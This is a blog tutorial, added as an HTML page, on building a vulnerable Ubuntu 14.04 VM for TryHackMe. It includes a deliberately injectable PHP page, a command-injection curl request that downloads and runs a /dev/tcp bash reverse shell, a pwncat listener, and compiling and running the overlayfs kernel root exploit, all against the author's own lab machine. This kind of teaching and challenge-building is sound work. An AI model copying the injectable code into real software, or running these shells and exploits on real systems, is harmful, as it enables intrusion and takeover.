@@ -1,0 +1,512 @@
+<!DOCTYPE html>
+<html lang="en"><head>
+  <meta charset="utf-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1"><!-- Begin Jekyll SEO tag v2.7.1 -->
+<title>Creating Boot2Root (HTB machines and tryhackme! rooms) challenges! | JamBlog</title>
+<meta name="generator" content="Jekyll v3.8.7" />
+<meta property="og:title" content="Creating Boot2Root (HTB machines and tryhackme! rooms) challenges!" />
+<meta name="author" content="JamBot" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="A guide on creating vulnerable virtual machines to practice penetration tests, and blue team operations" />
+<meta property="og:description" content="A guide on creating vulnerable virtual machines to practice penetration tests, and blue team operations" />
+<link rel="canonical" href="http://localhost:4000/blog/Boot2Root-creation" />
+<meta property="og:url" content="http://localhost:4000/blog/Boot2Root-creation" />
+<meta property="og:site_name" content="JamBlog" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2020-11-09T00:00:00+00:00" />
+<meta name="twitter:card" content="summary" />
+<meta property="twitter:title" content="Creating Boot2Root (HTB machines and tryhackme! rooms) challenges!" />
+<script type="application/ld+json">
+{"@type":"BlogPosting","url":"http://localhost:4000/blog/Boot2Root-creation","headline":"Creating Boot2Root (HTB machines and tryhackme! rooms) challenges!","dateModified":"2020-11-09T00:00:00+00:00","datePublished":"2020-11-09T00:00:00+00:00","author":{"@type":"Person","name":"JamBot"},"mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/blog/Boot2Root-creation"},"description":"A guide on creating vulnerable virtual machines to practice penetration tests, and blue team operations","@context":"https://schema.org"}</script>
+<!-- End Jekyll SEO tag -->
+<link rel="stylesheet" href="/assets/css/style.css">
+  <link rel="icon" type="image/png" href="/assets/favicon.png" /><link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="JamBlog" /></head>
+<body><div class="site-header">
+  <div class="wrapper">
+    <a class="site-title" rel="author" href="/">JamBlog<b class="command_prompt"></b><b class="blinking_cursor">_</b></a>
+    <span class="social_links">
+        <a class="color-cyan-hover" href="https://instagram.com/jamie_on_drums"><i class="fab fa-fab fa-fw fa-instagram"></i></a><a class="color-purple-hover" href="https://github.com/jambot3000"><i class="fab fa-github-square"></i></a><a class="color-blue-hover" href="https://twitter.com/Bot3000Jam"><i class="fab fa-fab fa-fw fa-twitter"></i></a>
+    </span>
+  </div>
+</div>
+<main class="page-content" aria-label="Content">
+      <div class="wrapper">
+        
+  <div class="author-box">
+    
+    
+        <img src="
+            https://github.com/jambot3000.png
+        " class="author-avatar" alt="Avatar" />
+    
+I'm Jamie, also known as JamBot! This is just where I'll document various impulsive ideas and projects of mine. I like computers and some other stuff :) 
+
+</div>
+
+
+<div class="post">
+  <h1 class="post-title">Creating Boot2Root (HTB machines and tryhackme! rooms) challenges!</h1>
+  
+  <div class="post-tags">
+      
+      <a class="tag" href="/tag/thm/">thm</a>
+      
+      <a class="tag" href="/tag/pentesting/">pentesting</a>
+      
+      <a class="tag" href="/tag/tutorial/">tutorial</a>
+      
+  </div>
+  
+  <div class="post-date">Published on 09 Nov 2020</div>
+  
+  <noscript>
+    <div class="post-description">A guide on creating vulnerable virtual machines to practice penetration tests, and blue team operations</div>
+  </noscript>
+  <div id="animated-post-description" class="post-description" style="display: none;"></div>
+  
+  <p>Edit: Thankyou sm to the people who used this to create their own CTF challenges! I’ve had a few people on discord talk to me about the exact same problem I had of not having enough resources- vagrant is nice but it’s so much easier just to design a vm in vmware then export as OVA</p>
+
+<p>Hello! So recently I’ve been doing a lot more boot2root challenges. I decided I want to start making some of my own challenges as I want to create tryhackme rooms, HTB machines and my own deployable virtual network that makes it easy to play around with different types of vulnerabilities and teach people about common (and not so common) CVE’s and pentesting techniques- also how to defend against them. After this I spent a while looking for some nice guides on it but couldn’t really find anything that went in depth? Anyways - here’s a tutorial on how to make vulnerable VM’s, and deploy them on <a href="https://tryhackme.com">tryhackme</a>.</p>
+
+<p>As this is just a tutorial, the machine made here will be quite basic and will not be made public :)</p>
+
+<h2 id="firstly">Firstly</h2>
+
+<p>While making machines I personally prefer to use VMware workstation and just their trial of pro. This is avaIlable for both linux and windows <a href="https://www.vmware.com/uk/products/workstation-pro/workstation-pro-evaluation.html">here</a> <del>(if you need pro I’m sure you can find a way to acquire it)</del>. Any software that can create virtual machines and export as an OVA/OVF file is fine though</p>
+
+<p>Also, uh system requirements. It goes without saying that if you want to create virtual machines, if you only have 4GB of RAM and you have to allocate all of that to the VM just to test, you’re gonna have a tough time. If you do have a potato PC however, don’t worry! There are linux distributions such as ubuntu server, that by default ship without a GUI and run perfectly fine on 1/2 GB of RAM and a single core. Older versions of windows such as XP run well on VMs even on lower end systems too. If you’re unsure of system requirements, just research a bit, a quick google search normally gets you what you’re looking for</p>
+
+<h2 id="chossing-our-os">Chossing our OS</h2>
+
+<p>Okay so this is fairly simple- we’re just picking what operating system we want our vm to be running. In my case I’m going to choose <a href="https://releases.ubuntu.com/14.04/">ubuntu 14.04</a> because</p>
+
+<ol>
+  <li>
+    <p>I already have it downloaded lol</p>
+  </li>
+  <li>
+    <p>By default this version of ubuntu (non server version) runs linux 3.13.0 which has a fairly easy to execute privilege escelation vulnerability. If you want to use another operating system and1. want to know what known kernel exploits there are, simply do:</p>
+
+    <div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code> test@ubuntu:~$ uname -a
+ Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64x86_64 GNU/       Linux
+</code></pre></div>    </div>
+  </li>
+</ol>
+
+<p>Or, if you aren’t sure how to set up VM’s so that you can run commands, go to the next step then come back here :)</p>
+
+<p>So as you can see our kernel version is 3.13.0. We can check this for an exploit using <a href="https://www.exploit-db.com/documentation/Offsec-SearchSploit.pdf">searchsploit</a> like so:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:~/Desktop/projects/test$ searchsploit -t linux 3.13.0 privilege -s
+-----------------------------------------------------------------------------------------------------   ---------- ------------------------ ---------------------------------
+ Exploit        Title                                                                                                                              |  Path
+-----------------------------------------------------------------------------------------------------   ---------- ------------------------ ---------------------------------
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege       Escalation                                   | linux/local/37292.c
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation    (Access /  etc/shadow)              | linux/local/37293.txt
+-----------------------------------------------------------------------------------------------------   ---------- ------------------------ ---------------------------------
+Shellcodes: No Results
+</code></pre></div></div>
+
+<p>As you can see, we have an exploit. It’s always important to check that the exploits you intend to work.. well, work. But before we do that let’s make a virtual machine and get stuff up and running!</p>
+
+<h2 id="making-the-vm">Making the VM</h2>
+
+<p>This is probably the easiest part :)</p>
+
+<p>Let’s open up vmware workstation, and click <code class="highlighter-rouge">file -&gt; new virtual machine -&gt; typical</code></p>
+
+<p><img src="https://jambot3000.github.io/assets/images/test-vm.png" /></p>
+
+<p>After this, we’re just gonna click next, choose our username &amp; password, and assign however much storage space will be needed. You likely won’t need any more than 10gb here. The process of creating a VM is fairly straight forward.</p>
+
+<p>Epic, now let’s boot- and see what happens :)</p>
+
+<p>So, eventually ubuntu should boot- and you should see it copying files and installing. After all that is done you’ll be greeted with the login screen!</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/ubuntulogin.png" /></p>
+
+<p>Epic, now it’s as simple as making whatever changes we want (i.e. adding vulnerable services etc) then exporting the OVA file.</p>
+
+<h2 id="adding-vulnerable-services">Adding <del>vulnerable</del> service(s).</h2>
+
+<p>These can be whatever you want, custom made web applications, SSH servers, FTP, or literally anything else you can think of. In our example I’m going to create an apache server running some PHP that leaves the server vulnerable to a command injection vulnerability. Expect some cooler stuff from future boxes that I make public - this is just an example :)</p>
+
+<p>So, you’re probably gonna need to install some packages, for example I needed to install the <code class="highlighter-rouge">apache2</code>, <code class="highlighter-rouge">php5-cli</code> and <code class="highlighter-rouge">libapache2-mod-php5</code> packages. This means you’re gonna need root access to use the apt package manager, so remember your passwords lol.</p>
+
+<p>Now I’m gonna start the apache service, then check that it is in fact running:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>test@ubuntu:~$ sudo service apache2 start
+ * Starting web server apache2                                                   * 
+test@ubuntu:~$ sudo service apache2 status
+ * apache2 is running
+</code></pre></div></div>
+
+<p>Great, now let’s get rid of the default <code class="highlighter-rouge">index.html</code> file in the <code class="highlighter-rouge">/var/www/html</code> directory. And instead replace it with <code class="highlighter-rouge">index.php</code>. So if apache is now configured to run PHP, if we insert the following code into index.php, it should allow us to perform a basic exploit.</p>
+
+<div class="language-php highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="cp">&lt;?php</span>
+<span class="k">print</span><span class="p">(</span><span class="s2">"to create a file, do GET /index.php?file=filename"</span><span class="p">);</span>
+<span class="nv">$file</span><span class="o">=</span><span class="nv">$_GET</span><span class="p">[</span><span class="s1">'file'</span><span class="p">];</span>
+<span class="nb">system</span><span class="p">(</span><span class="s2">"touch </span><span class="nv">$file</span><span class="s2">"</span><span class="p">);</span>
+<span class="cp">?&gt;</span>
+</code></pre></div></div>
+
+<p>So as you can see, if we perform a <code class="highlighter-rouge">GET</code>request to <code class="highlighter-rouge">http://ip_addr/index.php?filename=file</code> then in the <code class="highlighter-rouge">/var/www/html/</code> directory, a file with the name we supplied will be created.</p>
+
+<video controls="" width="320" height="400">
+    <source src="https://jambot3000.github.io/assets/videos/phpworks.mp4" />
+</video>
+
+<h2 id="exploitation">Exploitation</h2>
+
+<p>So, the exploit here, as most pentesters would immediately see, is that the php code passes our input into a system command. This is bad because we can escape the <code class="highlighter-rouge">touch</code> part of the command, by leaving a random filename after the <code class="highlighter-rouge">?file=</code> followed by either a <code class="highlighter-rouge">;</code>, <code class="highlighter-rouge">%26%26</code> (urlencoded &amp;&amp;) and a few other things.</p>
+
+<p>This works because on unix bases systems, a semicolon is the same as saying “after this has executed, even if I fail, go straight to the next thing”. <code class="highlighter-rouge">&amp;&amp; </code>is a bit different, because the next command is only executed if the first one succeeds.</p>
+
+<p>Here is the <strong>intended</strong> way of doing this machine:</p>
+
+<h3 id="reverse-shell">Reverse Shell</h3>
+
+<p>First we are going to want to get access to the machine properly. Right now we can execute commands but it will be easier to navigate the filesystem with a real shell. So, let’s set up our listener- I chose to use <a href="https://github.com/cytopia/pwncat">pwncat</a> which was talked about in a THM <a href="https://jambot3000.github.io/blog/THM-0day-writeup">writeup</a> of mine. Netcat or a variety of other tcp clients could have been used for this.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:~$ pwncat -l 1234 --self-inject /bin/bash:192.168.0.13:1234
+</code></pre></div></div>
+
+<p>Okay cool, so there are a few ways we can get access via a shell now. I’m going to create a bash script, containing a reverse shell, and then host that file on a http server. After that I’ll send a command to the server, telling it to get that file, make it executable, then run it.</p>
+
+<p>My bash script looks like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="c">#!/bin/bash</span>
+bash <span class="o">&gt;</span>&amp; /dev/tcp/192.168.0.13/1234 0&gt;&amp;1
+</code></pre></div></div>
+
+<p>Here’s how to host it while in the same directory as the bash script:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:/tmp/oof$ sudo python -m SimpleHTTPServer 1000
+Serving HTTP on 0.0.0.0 port 1000 ...
+</code></pre></div></div>
+
+<p>Awesome, now let’s make a curl command to do what we want, here’s what worked for me:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:/tmp/oof$ curl "http://172.16.44.130?file=/nothing;wget%20http://192.168.0.13:1000/   revshell.sh%20-O%20oof.sh;chmod%20-R%20777%20oof.sh;./oof.sh"
+</code></pre></div></div>
+
+<p>Let’s analyze this. First, the parameter for <code class="highlighter-rouge">file</code> supplied is <code class="highlighter-rouge">/dev/null</code>. This can actually be anything starting with <code class="highlighter-rouge">/</code> because the <code class="highlighter-rouge">www-data</code> user doesn’t have permission to change anything in the root directory. I just done <code class="highlighter-rouge">/dev/null</code> because anything passed to that is discarded. Next we can see it does a wget command <code class="highlighter-rouge">wget http://192.168.0.13:1000/revshell.sh -O oof.sh</code>. The <code class="highlighter-rouge">%20</code>’s just shows that there is a space there, because you can’t have spaces in URL’s.</p>
+
+<p>After this, we can see it does the command <code class="highlighter-rouge">chmod -R 777 oof.sh</code>. This makes the file we just downloaded executable, readable, and writeable, by all users- normally to make a file executable we do <code class="highlighter-rouge">chmod +x</code> but that didn’t seem to work for some. Finally- it executes it, simply with <code class="highlighter-rouge">./oof.sh</code>. So, let’s do this and see what happens.</p>
+
+<p>First, we can see that a request was successfully sent to our server.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:/tmp/oof$ sudo python -m SimpleHTTPServer 1000
+Serving HTTP on 0.0.0.0 port 1000 ...
+192.168.0.13 - - [11/Nov/2020 07:40:03] "GET /revshell.sh HTTP/1.1" 200 -
+</code></pre></div></div>
+
+<p>Great, next we know it made it executable and ran it, because pwncat started doing it’s thing.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:/tmp/oof$ pwncat -l 1234 --self-inject /bin/bash:192.168.0.13:1234
+[PWNCAT CnC] Checking if remote sends greeting...
+[PWNCAT CnC] Checking if remote sends prefix/suffix to every request...
+[PWNCAT CnC] Remote does not send prefix
+[PWNCAT CnC] Probing for: which python3
+[PWNCAT CnC] Potential path: /usr/bin/python3
+[PWNCAT CnC] Found valid Python3 version: 3.4.0
+...
+[PWNCAT CnC] Flushing receive buffer done.
+[PWNCAT CnC] Uploading: /home/jambot/.local/bin/pwncat -&gt; /tmp/tmps1_786_b (1/1)
+[PWNCAT CnC] Flushing receive buffer done.
+[PWNCAT CnC] Decoding: /tmp/tmps1_786_b -&gt; /tmp/tmpmyb6f2gn
+Starting pwncat rev shell: nohup /usr/bin/python3 /tmp/tmpmyb6f2gn 192.168.0.13 1234 --exec /bin/bash --reconn --reconn-wait 1 &gt; /tmp/  tmp076nqpbs 2&gt; /tmp/tmpyanlgsl8 &amp;
+[PWNCAT CnC] Waiting for socket
+[PWNCAT CnC] Done. Handing over to current shell.
+</code></pre></div></div>
+
+<p>Awesome, now we have a shell. Now even if we accidently exit our shell we can get it back like this:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:/tmp/oof$ pwncat -l 1234 -vv
+INFO: Listening on :::1234 (family 10/IPv6, TCP)
+INFO: Listening on 0.0.0.0:1234 (family 2/IPv4, TCP)
+INFO: Client connected from 192.168.0.13:43877 (family 2/IPv4, TCP)
+</code></pre></div></div>
+
+<p>Let’s see who we are:</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>python -c "import pty;pty.spawn('/bin/bash')"
+www-data@ubuntu:/var/www/html$ whoami
+www-data
+</code></pre></div></div>
+
+<p>Epic, so hopefully we should be privileged enough to see the user account files.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/var/www/html$ cd /home
+www-data@ubuntu:/home$ ls
+test 
+www-data@ubuntu:/home$ cd test
+cd test
+www-data@ubuntu:/home/test$ cd Desktop
+www-data@ubuntu:/home/test/Desktop$ ls 
+YES.MD	sudo  user.txt
+www-data@ubuntu:/home/test/Desktop$ cat user.txt
+cat user.txt
+THM{REDACTED}
+</code></pre></div></div>
+
+<p>Awesome, that’s user done.</p>
+
+<h2 id="privesc">Privesc</h2>
+
+<p>Now, some easy privesc:</p>
+
+<p>First, before we use some enumeration script let’s just go back to basics and see what we can run as root- and what kernel version we’re running.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp$ sudo -l
+[sudo] password for www-data:
+</code></pre></div></div>
+
+<p>Rip, we do not have a password so we can’t run anything as sudo without password for www-data. Next let’s check what kernel version this system is on.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp$ uname -a
+Linux ubuntu 3.13.0-32-generic #57-Ubuntu SMP Tue Jul 15 03:51:08 UTC 2014 x86_64 x86_64 x86_64 GNU/Linux
+</code></pre></div></div>
+
+<p>So as we can see this appears to be running an old kernel version. Let’s see if exploitdb has anything on this using searchsploit.</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:/tmp/oof$ searchsploit ubuntu 3.13.0
+---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
+Exploit Title                                                                                                                         |    Path
+---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation                                   |    linux/local/37292.c
+Linux Kernel 3.13.0 &lt; 3.19 (Ubuntu 12.04/14.04/14.10/15.04) - 'overlayfs' Local Privilege Escalation (Access /etc/shadow)              |    linux/local/37293.txt
+Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.04/13.10 x64) - 'CONFIG_X86_X32=y' Local Privilege Escalation (3)                                 |    linux_x86-64/local/31347.c
+Linux Kernel 3.4 &lt; 3.13.2 (Ubuntu 13.10) - 'CONFIG_X86_X32' Arbitrary Write (2)                                                        |    linux/local/31346.c
+Linux Kernel 4.10.5 / &lt; 4.14.3 (Ubuntu) - DCCP Socket Use-After-Free                                                                   |    linux/dos/43234.c
+Linux Kernel &lt; 4.13.9 (Ubuntu 16.04 / Fedora 27) - Local Privilege Escalation                                                          |    linux/local/45010.c
+Linux Kernel &lt; 4.4.0-116 (Ubuntu 16.04.4) - Local Privilege Escalation                                                                 |    linux/local/44298.c
+Linux Kernel &lt; 4.4.0-21 (Ubuntu 16.04 x64) - 'netfilter target_offset' Local Privilege Escalation                                      |    linux_x86-64/local/44300.c
+Linux Kernel &lt; 4.4.0-83 / &lt; 4.8.0-58 (Ubuntu 14.04/16.04) - Local Privilege Escalation (KASLR / SMEP)                                  |    linux/local/43418.c
+Linux Kernel &lt; 4.4.0/ &lt; 4.8.0 (Ubuntu 14.04/16.04 / Linux Mint 17/18 / Zorin) - Local Privilege Escalation (KASLR / SMEP)              |    linux/local/47169.c
+Ubuntu &lt; 15.10 - PT Chown Arbitrary PTs Access Via User Namespace Privilege Escalation                                                 |    linux/local/41760.txt
+---------------------------------------------------------------------------------------------------------------------------------------     ---------------------------------
+Shellcodes: No Result
+</code></pre></div></div>
+
+<p>Awesome, so there is quite a bit here. The one that looks most likely to work here is just the top one- so let’s download, compile, and run. :)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>jambot@dishwasher:/tmp/oof$ cat /opt/exploitdb/exploits/linux/local/37292.c &gt; exploit.c
+jambot@dishwasher:/tmp/oof$ sudo python3 -m http.server 1000
+Serving HTTP on 0.0.0.0 port 1000 (http://0.0.0.0:1000/) ...
+</code></pre></div></div>
+
+<p>Cool, now from our shell let’s download this file we are now serving, compile, and run. (the IP I download from may change, because I’ve worked on this from both school and at home, so it changes).</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code>www-data@ubuntu:/tmp$ wget http://10.41.205.30:1000/exploit.c &amp;&amp; gcc exploit.c -o oof &amp;&amp; chmod +x oof;./oof
+
+Awesome, so with this, we downloaded our file, compiled it, made the created binary executable, and then ran it, and…
+
+--2020-11-12 04:31:58--  http://10.41.205.30:1000/exploit.c
+Connecting to 10.41.205.30:1000... connected.
+HTTP request sent, awaiting response... 200 OK
+Length: 5119 (5.0K) [text/plain]
+Saving to: 'exploit.c'
+
+100%[======================================&gt;] 5,119       --.-K/s   in 0s      
+
+2020-11-12 04:31:58 (163 MB/s) - 'exploit.c' saved [5119/5119]
+
+spawning threads
+mount #1
+mount #2
+child threads done
+/etc/ld.so.preload created
+creating shared library
+
+# id
+uid=0(root) gid=0(root) groups=0(root),33(www-data)
+</code></pre></div></div>
+
+<p>Nice! Now we’re root :)</p>
+
+<div class="highlighter-rouge"><div class="highlight"><pre class="highlight"><code># cd /root
+# ls
+root.txt
+# cat root.txt
+THM{REDACTED}
+</code></pre></div></div>
+
+<p>Epic, and there we have it, we’ve succesfully created a basic vulnerable virtual machine, and proved that we can actually break into it. So now what?</p>
+
+<h2 id="deploying-to-thm">Deploying to THM</h2>
+
+<p>Okay so finally, here’s how to deploy to THM. Tryhack me have an awesome interface for deploying rooms that make it super simple to get started. First however, we’re going to want to export our virtual machine to an appropriate format. OVA is one of the accepted formats, so let’s do that:</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/export-to-ova.png" /></p>
+
+<p>So after exporting hopefully we should have our OVA file saved somewhere. Now we can actually create the room.</p>
+
+<p>Head over to <a href="https://tryhackme.com/upload">https://tryhackme.com/upload</a> (you may need to enable develop options to do this.) And now we’re going to import our OVA file, so that we can create a room, and use it in that room.</p>
+
+<p>Next you’re going to want to go to <a href="https://tryhackme.com/create-room]">https://tryhackme.com/create-room</a></p>
+
+<p><img src="https://jambot3000.github.io/assets/images/thm-create-room.png" /></p>
+
+<p>After we have created the room, we’re going to want to assign tasks, by going <a href="https://tryhackme.com/assign-tasks">here</a>.</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/assign-tasks-1.png" /></p>
+
+<p>Awesome, so the vm you uploaded should be the one you choose (mine was called “test” in this case). Then, because I had a user and root flag, I’m going to add 2 questions.</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/thm-questions.png" /></p>
+
+<p>After that, just hit the “create task” button :)</p>
+
+<p>Now, if you want to make your room public, you can go to <a href="https://tryhackme.com/manage-rooms">https://tryhackme.com/manage-rooms</a> and select the room of your choice.</p>
+
+<p><img src="https://jambot3000.github.io/assets/images/public-room.png" /></p>
+
+<p>Now, if you want to test your room, to verify that it is 100% working, simply use your own roomcode to access your room- and then atack the vm as you would in any other room :)</p>
+
+<p>That’s all, I hope this helped anyone learning how to make THM rooms :)</p>
+
+</div>
+
+
+
+
+
+<div class="related">
+  <h2>related posts</h2>
+  <ul class="related-posts">
+    
+      <li>
+        <h3>
+          <a href="/blog/discord-scammer-1">
+            Discord scammer #1
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog/THM-year-of-the-jellyfish">
+            TryHackMe! year of the jellyfish writeup
+          </a>
+        </h3>
+      </li>
+    
+      <li>
+        <h3>
+          <a href="/blog/THM-JPGchat-writeup">
+            TryHackMe! JPGchat room
+          </a>
+        </h3>
+      </li>
+    
+  </ul>
+</div>
+
+
+
+
+  
+  <h2>all tags</h2>
+  <div class="tag-cloud"><a href="/tag/crackme/" class="set-1">crackme</a> <a href="/tag/locks/" class="set-1">locks</a> <a href="/tag/misc/" class="set-4">misc</a> <a href="/tag/pentesting/" class="set-5">pentesting</a> <a href="/tag/thm/" class="set-5">thm</a> <a href="/tag/tutorial/" class="set-2">tutorial</a> <a href="/tag/writeup/" class="set-2">writeup</a></div>
+  
+
+
+
+
+<script>
+  let i = 0;
+  const text = 'A guide on creating vulnerable virtual machines to practice penetration tests, and blue team operations';
+  const speed = parseInt('50');
+  
+  function typeWriter() {
+    if (i < text.length) {
+      document.getElementById('animated-post-description').innerHTML += text.charAt(i);
+      i++;
+      setTimeout(typeWriter, speed);
+    }
+  }
+
+  document.getElementById('animated-post-description').style.display = 'initial';
+  typeWriter();
+</script>
+
+      </div>
+    </main><footer class="site-footer">
+  <div class="wrapper">
+    <div class="credits"><a href="https://github.com/bitbrain/jekyll-dash">dash</a> theme for Jekyll by <a href="https://github.com/bitbrain">bitbrain</a> made with <i class="fas fa-heart"></i><div class="toggleWrapper">
+    <input type="checkbox" class="dn" id="theme-toggle" onclick="modeSwitcher()" checked />
+    <label for="theme-toggle" class="toggle">
+    <span class="toggle__handler">
+      <span class="crater crater--1"></span>
+      <span class="crater crater--2"></span>
+      <span class="crater crater--3"></span>
+    </span>
+        <span class="star star--1"></span>
+        <span class="star star--2"></span>
+        <span class="star star--3"></span>
+        <span class="star star--4"></span>
+        <span class="star star--5"></span>
+        <span class="star star--6"></span>
+    </label>
+</div>
+<script type="text/javascript">
+const theme = localStorage.getItem('theme');
+
+if (theme === "light") {
+    document.documentElement.setAttribute('data-theme', 'light');
+} else {
+    document.documentElement.setAttribute('data-theme', 'dark');
+}
+const userPrefers = getComputedStyle(document.documentElement).getPropertyValue('content');
+
+function activateDarkTheme() {
+    document.getElementById('theme-toggle').checked = true;
+    document.documentElement.setAttribute('data-theme', 'dark');
+    document.documentElement.classList.add('theme--dark');
+    document.documentElement.classList.remove('theme--light');
+	document.getElementById("theme-toggle").className = 'light';
+	window.localStorage.setItem('theme', 'dark');
+}
+
+function activateLightTheme() {
+    document.getElementById('theme-toggle').checked = false;
+    document.documentElement.setAttribute('data-theme', 'light');
+    document.documentElement.classList.add('theme--light');
+    document.documentElement.classList.remove('theme--dark');
+	document.getElementById("theme-toggle").className = 'dark';
+	window.localStorage.setItem('theme', 'light');
+}
+
+if (theme === "dark") {
+    activateDarkTheme();
+} else if (theme === "light") {
+    activateLightTheme();
+} else if  (userPrefers === "light") {
+    activateDarkTheme();
+} else {
+    activateDarkTheme();
+}
+
+function modeSwitcher() {
+	let currentMode = document.documentElement.getAttribute('data-theme');
+	if (currentMode === "dark") {
+	    activateLightTheme();
+	} else {
+	    activateDarkTheme();
+	}
+}
+</script></div>
+  </div>
+</footer>
+
+
+<script>
+      window.FontAwesomeConfig = {
+        searchPseudoElements: true
+      }
+    </script>
+  </body>
+
+</html>
